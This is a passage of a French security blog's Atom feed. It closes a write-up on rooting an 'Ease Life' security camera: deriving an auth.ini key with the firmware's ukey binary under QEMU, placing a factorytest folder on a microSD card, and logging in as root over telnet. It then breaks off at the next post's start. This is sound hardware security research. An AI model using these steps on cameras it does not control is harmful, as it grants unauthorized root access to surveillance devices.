+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">KEY=
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">MD5SUM_FILE=test.md5sum
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">MD5SUM_MD5=1de768028943bae86bfc10a607ceec56
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Calculons ensuite la &lt;em>KEY&lt;/em> de &lt;em>auth.ini&lt;/em> avec le binaire &lt;em>/bin/ukey&lt;/em> :&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ file ./ukey
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./ukey: ELF 32-bit LSB executable, ARM, EABI5 version &lt;span class="m">1&lt;/span> &lt;span class="o">(&lt;/span>SYSV&lt;span class="o">)&lt;/span>, dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ qemu-arm -L extractions/firm.bin.extracted/1E0000/squashfs-root ./ukey -r /auth.ini
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">getKey ./auth.ini
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">KEY&lt;/span>&lt;span class="o">=&lt;/span>2b98bb1900000089
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Le contenu final de &lt;em>auth.ini&lt;/em> sera donc :&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">KEY=2b98bb1900000089
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">MD5SUM_FILE=test.md5sum
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">MD5SUM_MD5=1de768028943bae86bfc10a607ceec56
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="flex align-center gblog-post__anchorwrap">
+&lt;h3 id="factorytest"
+>
+factorytest/
+&lt;/h3>
+&lt;a data-clipboard-text="https://0x09.dev/posts/ease_life_security_camera_part_1/#factorytest" class="gblog-post__anchor clip flex align-center" aria-label="Anchor factorytest/" href="#factorytest">
+&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
+&lt;/a>
+&lt;/div>
+&lt;p>Enfin, il ne restera plus qu&amp;rsquo;à copier les précédents fichiers dans un dossier &lt;em>factorytest&lt;/em> :&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">factorytest
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">├── auth.ini
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">├── factorytest.sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└── test.md5sum
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">0&lt;/span> directories, &lt;span class="m">3&lt;/span> files
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="flex align-center gblog-post__anchorwrap">
+&lt;h2 id="r00t"
+>
+R00T
+&lt;/h2>
+&lt;a data-clipboard-text="https://0x09.dev/posts/ease_life_security_camera_part_1/#r00t" class="gblog-post__anchor clip flex align-center" aria-label="Anchor R00T" href="#r00t">
+&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
+&lt;/a>
+&lt;/div>
+&lt;p>Le dossier &lt;strong>factorytest&lt;/strong> ayant été copié dans la carte microSD, il nous restera juste à insérer cette dernière et démarrer la caméra :&lt;/p>
+&lt;figure style="text-align: center;">&lt;img src="/img/ease-life-camera/camera-insert-sd.png" style="width: 60%; height: 100%;"/>&lt;figcaption style="text-align: center;">&lt;/figcaption>Insertion de la carte SD dans la caméra&lt;/figure>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ telnet 10.166.181.156
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Trying 10.166.181.156...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Connected to 10.166.181.156.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Escape character is &lt;span class="s1">&amp;#39;^]&amp;#39;&lt;/span>.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> _&lt;span class="p">|&lt;/span>/_
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>o o&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+----------------oOO-&lt;span class="o">{&lt;/span>_&lt;span class="o">}&lt;/span>-OOo----------------+
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> W E L C O M E ! &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+-------------------------------------------+
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[[&lt;/span> 13e5be2cdcc8c390be436fb00a0248be &lt;span class="o">]]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vi login: admin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Password:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Welcome to vi
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@vi:root&lt;span class="o">]&lt;/span>&lt;span class="c1"># id&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">uid&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="o">(&lt;/span>root&lt;span class="o">)&lt;/span> &lt;span class="nv">gid&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">0&lt;/span> &lt;span class="nv">groups&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>root@vi:root&lt;span class="o">]&lt;/span>&lt;span class="c1">#&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>On peut également confirmer que la fonctionnalité de vidéo surveillance n&amp;rsquo;a pas été perturbée depuis l&amp;rsquo;application &amp;lsquo;Ease Life&amp;rsquo; :&lt;/p>
+&lt;figure style="text-align: center;">&lt;img src="/img/ease-life-camera/ease-life-normal-behavior.png" style="width: 50%; height: 50%;"/>&lt;figcaption style="text-align: center;">&lt;/figcaption>Vidéo surveillance toujours fonctionnelle&lt;/figure>
+&lt;div class="flex align-center gblog-post__anchorwrap">
+&lt;h1 id="références"
+>
+Références
+&lt;/h1>
+&lt;a data-clipboard-text="https://0x09.dev/posts/ease_life_security_camera_part_1/#références" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Références" href="#r%c3%a9f%c3%a9rences">
+&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
+&lt;/a>
+&lt;/div>
+&lt;ul>
+&lt;li>[1] &lt;a
+class="gblog-markdown__link"
+href="https://securitylab.servicenow.com/research/2025-04-07-Binary-Data-Analysis-The-Role-of-Entropy/"
+>https://securitylab.servicenow.com/research/2025-04-07-Binary-Data-Analysis-The-Role-of-Entropy/&lt;/a>&lt;/li>
+&lt;/ul></content><category scheme="https://0x09.dev/authors/skander-belabed" term="skander-belabed" label="skander-belabed"/><category scheme="https://0x09.dev/tags/Reverse-engineering" term="Reverse-engineering" label="Reverse engineering"/><category scheme="https://0x09.dev/tags/Security" term="Security" label="Security"/><category scheme="https://0x09.dev/tags/Hardware" term="Hardware" label="Hardware"/><category scheme="https://0x09.dev/tags/IoT" term="IoT" label="IoT"/></entry><entry><title>[CVE-2025-52089] Toto Découvre Une "Interface De Debug"</title><link href="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/" rel="alternate" type="text/html" hreflang="en"/><id>https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/</id><author><name>Skander BELABED</name></author><published>2025-07-10T20:18:18+02:00</published><updated>2025-08-30T19:30:52+02:00</updated><content type="html">
 &lt;figure style="text-align: center;">&lt;img src="/img/toto/toto-door.png" style="width: 80%; height: 100%;" />&lt;/figure>
 &lt;hr>
 &lt;div class="flex align-center gblog-post__anchorwrap">
